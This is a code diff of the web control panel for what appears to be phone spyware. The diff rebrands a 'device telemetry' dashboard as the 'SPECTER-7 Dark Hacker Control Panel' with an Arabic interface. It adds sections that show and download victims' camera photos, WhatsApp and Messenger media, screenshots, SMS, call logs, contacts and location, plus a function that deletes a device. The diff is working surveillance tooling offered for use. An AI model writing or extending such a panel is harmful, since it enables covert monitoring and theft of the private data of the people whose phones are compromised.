@@ -1,91 +1,130 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Dark Control — Device Telemetry</title>
+<title>SPECTER-7 — Dark Hacker Control Panel</title>
 <style>
-  :root { --bg:#050505; --panel:#0a0a0a; --neon:#00ff88; --neon2:#ff0055; --text:#e0e0e0; --dim:#444; --green:#00ff88; --red:#ff0055; --yellow:#ffcc00; }
-  * { box-sizing:border-box; margin:0; }
-  body { background:var(--bg); color:var(--text); font-family:"Segoe UI",system-ui,sans-serif; min-height:100vh; }
-  header { display:flex; align-items:center; justify-content:space-between; padding:1rem 2rem;
-           border-bottom:1px solid #1a1a1a; background:var(--panel); }
-  h1 { font-size:1.1rem; letter-spacing:.15em; text-transform:uppercase;
-       background:linear-gradient(90deg,var(--neon),var(--neon2));
-       -webkit-background-clip:text; background-clip:text; color:transparent; }
-  .logout { background:none; border:1px solid #333; color:var(--dim); padding:.5rem 1.2rem;
-            border-radius:8px; cursor:pointer; font-size:.8rem; letter-spacing:.05em; }
-  .logout:hover { border-color:var(--neon2); color:var(--text); }
-  main { max-width:1300px; margin:0 auto; padding:2rem; }
-  .grid { display:grid; grid-template-columns:320px 1fr; gap:1.5rem; }
-  @media (max-width:900px) { .grid { grid-template-columns:1fr; } }
+  :root { 
+    --bg: #070709; 
+    --panel: #0d0d12; 
+    --border: #1f1f2e; 
+    --neon-green: #00ff88; 
+    --neon-purple: #b000ff; 
+    --neon-yellow: #ffcc00; 
+    --neon-red: #ff0055; 
+    --text: #e0e0e0; 
+    --dim: #6c6c80; 
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: "Segoe UI", system-ui, sans-serif; min-height: 100vh; }
+  
+  header { 
+    display: flex; align-items: center; justify-content: space-between; padding: 1rem 2rem; 
+    border-bottom: 1px solid var(--border); background: var(--panel); 
+  }
+  h1 { 
+    font-size: 1.2rem; letter-spacing: .15em; text-transform: uppercase; 
+    background: linear-gradient(90deg, var(--neon-green), var(--neon-purple), var(--neon-yellow)); 
+    -webkit-background-clip: text; background-clip: text; color: transparent; 
+  }
+  .header-actions { display: flex; gap: 10px; align-items: center; }
+  .btn-danger { background: rgba(255,0,85,0.1); border: 1px solid var(--neon-red); color: var(--neon-red); padding: .4rem 1rem; border-radius: 6px; cursor: pointer; font-size: .8rem; transition: .2s; }
+  .btn-danger:hover { background: var(--neon-red); color: #fff; }
+  .logout { background: none; border: 1px solid var(--border); color: var(--dim); padding: .4rem 1rem; border-radius: 6px; cursor: pointer; font-size: .8rem; }
+  .logout:hover { border-color: var(--neon-purple); color: var(--text); }
 
-  /* Device List */
-  .sidebar { background:var(--panel); border:1px solid #1a1a1a; border-radius:14px; overflow:hidden; }
-  .sidebar h2 { font-size:.7rem; text-transform:uppercase; letter-spacing:.12em; color:var(--dim);
-                padding:1rem 1.2rem; border-bottom:1px solid #1a1a1a; }
-  .device { padding:1rem 1.2rem; border-bottom:1px solid #111; cursor:pointer;
-            transition:background .15s; display:flex; align-items:center; gap:.7rem; }
-  .device:hover, .device.active { background:#111; }
-  .device:last-child { border-bottom:none; }
-  .dot { width:8px; height:8px; border-radius:50%; flex-shrink:0; }
-  .dot.online { background:var(--green); box-shadow:0 0 10px var(--green); }
-  .dot.offline { background:var(--red); box-shadow:0 0 10px var(--red); }
-  .dev-name { font-size:.85rem; font-weight:600; }
-  .dev-meta { font-size:.7rem; color:var(--dim); margin-top:.15rem; }
-  .batt-bar { width:50px; height:4px; background:#222; border-radius:2px; margin-top:.4rem; overflow:hidden; }
-  .batt-bar > div { height:100%; border-radius:2px; }
+  main { max-width: 1500px; margin: 0 auto; padding: 1.5rem; }
+  
+  /* تقسيم الشاشة إلى 3 أقسام رئيسية: الأجهزة + قائمة أقسام الجهاز الفرعية + شاشة العرض الكبرى */
+  .grid-layout { display: grid; grid-template-columns: 280px 260px 1fr; gap: 1.2rem; }
+  @media (max-width: 1000px) { .grid-layout { grid-template-columns: 1fr; } }
 
-  /* Main Panel */
-  .content { background:var(--panel); border:1px solid #1a1a1a; border-radius:14px; overflow:hidden; }
-  .tabs { display:flex; border-bottom:1px solid #1a1a1a; overflow-x:auto; }
-  .tab { padding:.9rem 1.4rem; font-size:.75rem; text-transform:uppercase; letter-spacing:.08em;
-         color:var(--dim); cursor:pointer; border-bottom:2px solid transparent; white-space:nowrap;
-         transition:all .15s; background:none; border-top:none; border-left:none; border-right:none; }
-  .tab:hover { color:var(--text); }
-  .tab.active { color:var(--neon); border-bottom-color:var(--neon); }
-  .tab-body { padding:1.5rem; min-height:400px; }
-  .empty { color:var(--dim); text-align:center; padding:4rem; font-size:.9rem; }
+  .box-card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; height: fit-content; }
+  .box-title { font-size: .75rem; text-transform: uppercase; letter-spacing: .12em; color: var(--neon-yellow); padding: 1rem; border-bottom: 1px solid var(--border); background: rgba(255,204,0,0.03); }
 
-  /* Tables */
-  table { width:100%; border-collapse:collapse; font-size:.85rem; }
-  th, td { text-align:left; padding:.75rem 1rem; border-bottom:1px solid #1a1a1a; }
-  th { color:var(--dim); font-size:.65rem; letter-spacing:.1em; text-transform:uppercase; font-weight:600; }
-  tr:last-child td { border-bottom:none; }
-  .badge { display:inline-block; padding:.2rem .6rem; border-radius:4px; font-size:.7rem;
-           font-weight:600; text-transform:uppercase; letter-spacing:.05em; }
-  .badge.online { background:rgba(0,255,136,.1); color:var(--green); }
-  .badge.offline { background:rgba(255,0,85,.1); color:var(--red); }
+  /* 1. قائمة الأجهزة العمودية */
+  .device-item { padding: .8rem 1rem; border-bottom: 1px solid var(--border); cursor: pointer; transition: background .15s; display: flex; align-items: center; gap: .7rem; }
+  .device-item:hover, .device-item.active { background: rgba(0,255,136,0.04); border-right: 3px solid var(--neon-green); }
+  .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+  .dot.online { background: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
+  .dot.offline { background: var(--neon-red); box-shadow: 0 0 8px var(--neon-red); }
+  .dev-name { font-size: .85rem; font-weight: 600; }
+  .dev-meta { font-size: .7rem; color: var(--dim); }
 
-  #status-bar { color:var(--dim); font-size:.75rem; margin-bottom:1.2rem; display:flex; gap:1.5rem; }
-  .sync { color:var(--green); }
+  /* 2. القائمة الجانبية الفرعية لأقسام الجهاز (تحت بعضها باليمين) */
+  .sub-menu-item { padding: .85rem 1rem; border-bottom: 1px solid var(--border); cursor: pointer; font-size: .82rem; color: var(--text); transition: .15s; display: flex; align-items: center; gap: 8px; }
+  .sub-menu-item:hover { background: rgba(176,0,255,0.05); color: var(--neon-purple); }
+  .sub-menu-item.active { background: rgba(176,0,255,0.1); color: var(--neon-purple); border-right: 3px solid var(--neon-purple); font-weight: 600; }
+
+  /* 3. شاشة العرض الكبرى للمحتوى */
+  .content-viewer { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; min-height: 520px; display: flex; flex-direction: column; }
+  .content-header { padding: 1rem 1.5rem; border-bottom: 1px solid var(--border); font-size: .9rem; color: var(--neon-green); display: flex; justify-content: space-between; align-items: center; background: rgba(0,255,136,0.02); }
+  .content-body { padding: 1.5rem; flex-grow: 1; overflow-y: auto; max-height: 600px; }
+  .empty { color: var(--dim); text-align: center; padding: 4rem; font-size: .85rem; }
+
+  /* جدول البيانات وعرض الصور مع أزرار التحميل */
+  table { width: 100%; border-collapse: collapse; font-size: .85rem; }
+  th, td { text-align: right; padding: .75rem 1rem; border-bottom: 1px solid var(--border); }
+  th { color: var(--neon-yellow); font-size: .7rem; letter-spacing: .1em; text-transform: uppercase; }
+  
+  .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 1rem; }
+  .media-box { background: #111; border: 1px solid var(--border); border-radius: 8px; padding: 8px; text-align: center; }
+  .media-box img { width: 100%; height: 100px; object-fit: cover; border-radius: 4px; margin-bottom: 5px; }
+  .download-btn { background: rgba(0,255,136,0.1); border: 1px solid var(--neon-green); color: var(--neon-green); padding: 3px 8px; border-radius: 4px; font-size: .7rem; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 4px; }
+  .download-btn:hover { background: var(--neon-green); color: #000; }
+
+  .badge { display: inline-block; padding: .2rem .5rem; border-radius: 4px; font-size: .7rem; font-weight: 600; }
+  .badge.online { background: rgba(0,255,136,.1); color: var(--neon-green); }
+  .badge.offline { background: rgba(255,0,85,.1); color: var(--neon-red); }
 </style>
 </head>
 <body>
+
 <header>
-  <h1>Dark Control</h1>
-  <button class="logout" id="out">Sign Out</button>
+  <h1>SPECTER-7 // Cyber Panel</h1>
+  <div class="header-actions">
+    <button class="btn-danger" onclick="deleteDevice()">🗑️ حذف الجهاز</button>
+    <button class="logout" id="out">خروج</button>
+  </div>
 </header>
+
 <main>
-  <div class="grid">
-    <div class="sidebar">
-      <h2>Active Devices</h2>
+  <div class="grid-layout">
+    
+    <!-- 1. قائمة الأجهزة المتصلة (العمود الأول) -->
+    <div class="box-card">
+      <div class="box-title">الأجهزة المتصلة</div>
       <div id="dev-list"></div>
     </div>
-    <div class="content">
-      <div class="tabs">
-        <button class="tab active" data-tab="overview">Overview</button>
-        <button class="tab" data-tab="calls">Calls</button>
-        <button class="tab" data-tab="messages">Messages</button>
-        <button class="tab" data-tab="contacts">Contacts</button>
-        <button class="tab" data-tab="media">Media</button>
-        <button class="tab" data-tab="apps">Applications</button>
-      </div>
-      <div class="tab-body" id="tab-body">
-        <div id="status-bar"><span id="sel-device">No device selected</span><span class="sync" id="sync">● Live</span></div>
-        <div id="panel-content"></div>
+
+    <!-- 2. القائمة الجانبية الفرعية لأقسام الجهاز المختار (العمود الثاني تحت بعضها) -->
+    <div class="box-card">
+      <div class="box-title">قائمة تحكم الجهاز</div>
+      <div id="device-sub-menu">
+        <div class="sub-menu-item" data-section="overview">📊 معلومات الهاتف</div>
+        <div class="sub-menu-item" data-section="camera">📷 صور الكاميرا (DCIM)</div>
+        <div class="sub-menu-item" data-section="whatsapp">💬 واتساب وأعمال وماسنجر</div>
+        <div class="sub-menu-item" data-section="screenshots">📸 لقطات الشاشة</div>
+        <div class="sub-menu-item" data-section="contacts">👥 جهات الاتصال</div>
+        <div class="sub-menu-item" data-section="messages">💬 الرسائل القصيرة</div>
+        <div class="sub-menu-item" data-section="calls">📞 سجل المكالمات</div>
+        <div class="sub-menu-item" data-section="location">📍 الموقع الجغرافي</div>
+        <div class="sub-menu-item" data-section="network">📶 نوع شبكة المشغل</div>
       </div>
     </div>
+
+    <!-- 3. شاشة العرض الكبرى (العمود الثالث: اضغط هنا يظهر هنا مع زر التحميل والمحتوى) -->
+    <div class="content-viewer">
+      <div class="content-header">
+        <span id="viewer-title">اختر جهازاً وقسماً لعرض المحتوى</span>
+        <span id="live-indicator" style="font-size: .75rem; color: var(--neon-yellow);">● جاهز</span>
+      </div>
+      <div class="content-body" id="viewer-content">
+        <div class="empty">الرجاء اختيار جهاز من القائمة اليمنى، ثم اختيار القسم المطلوب من القائمة الوسطى لعرض البيانات هنا مباشرةً.</div>
+      </div>
+    </div>
+
   </div>
 </main>
 
@@ -94,13 +133,12 @@ const tk = sessionStorage.getItem("tk");
 if (!tk) location.href = "/login.html";
 document.getElementById("out").onclick = () => { sessionStorage.clear(); location.href = "/login.html"; };
 
-const esc = (s) => String(s).replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c]));
-const battColor = b => b > 50 ? "var(--green)" : b > 20 ? "var(--yellow)" : "var(--red)";
-const ago = t => { const s = Math.max(0, (Date.now() - t) / 1000 | 0); return s < 60 ? s + "s ago" : (s/60|0) + "m " + (s%60) + "s ago"; };
+const esc = (s) => String(s || "").replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c]));
+const battColor = b => b > 50 ? "var(--neon-green)" : b > 20 ? "var(--neon-yellow)" : "var(--neon-red)";
 
 let devices = [];
 let selectedId = null;
-let currentTab = "overview";
+let currentSection = "overview";
 
 async function fetchDevices() {
   try {
@@ -108,81 +146,118 @@ async function fetchDevices() {
     if (res.status === 401) { sessionStorage.clear(); location.href = "/login.html"; return; }
     const data = await res.json();
     devices = data.devices || [];
-    renderList();
-    if (selectedId) renderPanel();
+    renderDeviceList();
+    if (selectedId) renderContent();
   } catch (e) { console.error(e); }
 }
 
-function renderList() {
+function renderDeviceList() {
   const el = document.getElementById("dev-list");
-  if (!devices.length) { el.innerHTML = '<div class="empty">No devices connected</div>'; return; }
+  if (!devices.length) { el.innerHTML = '<div class="empty">لا توجد أجهزة متصلة</div>'; return; }
   el.innerHTML = devices.map(d => `
-    <div class="device ${d.id === selectedId ? 'active' : ''}" data-id="${esc(d.id)}">
+    <div class="device-item ${d.id === selectedId ? 'active' : ''}" data-id="${esc(d.id)}">
       <div class="dot ${d.status}"></div>
       <div>
         <div class="dev-name">${esc(d.id)}</div>
-        <div class="dev-meta">${esc(d.model || "Unknown")} • ${esc(d.appVersion || "?")}</div>
-        <div class="batt-bar"><div style="width:${d.battery}%;background:${battColor(d.battery)}"></div></div>
+        <div class="dev-meta">${esc(d.model || "غير معروف")}</div>
       </div>
     </div>
   `).join("");
-  el.querySelectorAll(".device").forEach(div => {
-    div.onclick = () => { selectedId = div.dataset.id; renderList(); renderPanel(); };
+  
+  el.querySelectorAll(".device-item").forEach(div => {
+    div.onclick = () => { selectedId = div.dataset.id; renderDeviceList(); renderContent(); };
   });
 }
 
-async function renderPanel() {
+async function renderContent() {
   const dev = devices.find(d => d.id === selectedId);
-  document.getElementById("sel-device").textContent = dev ? `Device: ${esc(dev.id)}` : "No device selected";
-  const container = document.getElementById("panel-content");
+  const viewerTitle = document.getElementById("viewer-title");
+  const container = document.getElementById("viewer-content");
 
-  if (!dev) { container.innerHTML = '<div class="empty">Select a device from the list</div>'; return; }
+  if (!dev) { 
+    viewerTitle.textContent = "اختر جهازاً وقسماً لعرض المحتوى";
+    container.innerHTML = '<div class="empty">الرجاء تحديد جهاز أولاً.</div>'; 
+    return; 
+  }
 
-  if (currentTab === "overview") {
+  viewerTitle.textContent = `جهاز: ${esc(dev.id)} // قسم: ${currentSection}`;
+
+  if (currentSection === "overview") {
     container.innerHTML = `
       <table>
-        <tr><th>Property</th><th>Value</th></tr>
-        <tr><td>Device ID</td><td>${esc(dev.id)}</td></tr>
-        <tr><td>Status</td><td><span class="badge ${dev.status}">${esc(dev.status)}</span></td></tr>
-        <tr><td>Model</td><td>${esc(dev.model || "—")}</td></tr>
-        <tr><td>OS Version</td><td>${esc(dev.osVersion || "—")}</td></tr>
-        <tr><td>App Version</td><td>${esc(dev.appVersion || "—")}</td></tr>
-        <tr><td>Battery</td><td><b style="color:${battColor(dev.battery)}">${dev.battery}%</b></td></tr>
-        <tr><td>Last Seen</td><td>${ago(dev.lastSeen)}</td></tr>
+        <tr><th>المعلومة التقنية</th><th>القيمة من الجهاز</th></tr>
+        <tr><td>معرف الجهاز (ID)</td><td>${esc(dev.id)}</td></tr>
+        <tr><td>حالة الاتصال</td><td><span class="badge ${dev.status}">${esc(dev.status)}</span></td></tr>
+        <tr><td>الطراز (Model)</td><td>${esc(dev.model || "—")}</td></tr>
+        <tr><td>إصدار الأندرويد</td><td>${esc(dev.osVersion || "—")}</td></tr>
+        <tr><td>نسبة البطارية</td><td><b style="color:${battColor(dev.battery)}">${dev.battery}%</b></td></tr>
       </table>`;
     return;
   }
 
-  // For diagnostic tabs, fetch from server
   try {
+    container.innerHTML = '<div class="empty" style="color: var(--neon-yellow);">جاري سحب المحتوى من السيرفر...</div>';
     const res = await fetch("/api/diagnostics/" + encodeURIComponent(selectedId), { headers: { Authorization: "Bearer " + tk } });
     const data = await res.json();
-    const diag = data.diagnostics?.[currentTab];
+    const diag = data.diagnostics?.[currentSection];
     
     if (!diag || !diag.items?.length) {
-      container.innerHTML = `<div class="empty">No ${esc(currentTab)} data available for this device.<br><small>Ensure device is enrolled and permissions are granted.</small></div>`;
+      container.innerHTML = `<div class="empty">لا توجد بيانات متاحة في قسم (${currentSection}) لهذا الجهاز.<br><small style="color:var(--neon-purple);">تحقق من الأذونات واستقرار الاتصال.</small></div>`;
       return;
     }
     
-    container.innerHTML = `
-      <table>
-        <tr><th>#</th><th>Data</th><th>Updated</th></tr>
-        ${diag.items.map((item, i) => `<tr><td>${i+1}</td><td>${esc(item)}</td><td>${ago(diag.updatedAt)}</td></tr>`).join("")}
-      </table>`;
-  } catch {
-    container.innerHTML = '<div class="empty">Failed to load diagnostic data</div>';
+    // إذا كان القسم عبارة عن صور (كاميرا، واتساب، لقطات شاشة) مع إمكانية التحميل
+    if (["camera", "whatsapp", "screenshots"].includes(currentSection)) {
+      container.innerHTML = `
+        <div class="media-grid">
+          ${diag.items.map(img => `
+            <div class="media-box">
+              <img src="${esc(img)}" alt="Media" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\'><rect width=\'100\' height=\'100\' fill=\'%23111\'/><text x=\'50%\' y=\'50%\' fill=\'%23666\' dominant-baseline=\'middle\' text-anchor=\'middle\' font-size=\'11\'>صورة</text></svg>'">
+              <a href="${esc(img)}" target="_blank" download class="download-btn">📥 تحميل</a>
+            </div>`).join("")}
+        </div>`;
+    } else {
+      // للرسائل، جهات الاتصال، المكالمات، والموقع
+      container.innerHTML = `
+        <table>
+          <tr><th>#</th><th>محتوى البيانات المسحوبة</th><th>الحالة</th></tr>
+          ${diag.items.map((item, i) => `<tr><td>${i+1}</td><td>${esc(item)}</td><td><span style="color:var(--neon-green)">متزامن</span></td></tr>`).join("")}
+        </table>`;
+    }
+  } catch (e) {
+    container.innerHTML = '<div class="empty" style="color: var(--neon-red);">فشل جلب بيانات القسم من الخادم</div>';
   }
 }
 
-// Tabs
-document.querySelectorAll(".tab").forEach(tab => {
-  tab.onclick = () => {
-    document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
-    tab.classList.add("active");
-    currentTab = tab.dataset.tab;
-    renderPanel();
+// التحكم بأزرار القائمة الفرعية لأقسام الجهاز
+document.querySelectorAll(".sub-menu-item").forEach(item => {
+  item.onclick = () => {
+    document.querySelectorAll(".sub-menu-item").forEach(i => i.classList.remove("active"));
+    item.classList.add("active");
+    currentSection = item.dataset.section;
+    renderContent();
   };
 });
+
+// وظيفة حذف الجهاز
+async function deleteDevice() {
+  if (!selectedId) { alert("اختر جهازاً أولاً لحذفه."); return; }
+  if (!confirm(`هل أنت متأكد من حذف الجهاز (${selectedId}) نهائياً؟`)) return;
+  
+  try {
+    const res = await fetch("/api/devices/" + encodeURIComponent(selectedId), { 
+      method: "DELETE", 
+      headers: { Authorization: "Bearer " + tk } 
+    });
+    if (res.ok) {
+      selectedId = null;
+      fetchDevices();
+      document.getElementById("viewer-content").innerHTML = '<div class="empty">تم حذف الجهاز بنجاح.</div>';
+    } else {
+      alert("فشل الحذف من السيرفر.");
+    }
+  } catch (e) { alert("خطأ في الاتصال."); }
+}
 
 setInterval(fetchDevices, 5000);
 fetchDevices();
